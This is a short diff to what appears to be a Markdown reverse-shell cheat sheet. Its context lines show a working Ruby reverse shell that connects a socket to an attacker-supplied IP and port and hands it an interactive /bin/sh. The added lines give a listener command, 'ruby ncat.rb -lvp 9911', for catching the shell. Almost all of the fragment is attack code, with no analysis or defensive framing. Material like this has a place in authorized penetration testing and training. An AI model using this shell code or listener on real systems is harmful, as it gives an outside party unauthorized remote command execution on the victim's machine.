@@ -40,7 +40,10 @@ ip, port = ARGV
 s = TCPSocket.open(ip,port).to_i
 exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
 ```
-
+- To listen 
+```
+ruby ncat.rb -lvp 9911 
+```
 
 
 ## Bind and Reverse shell 
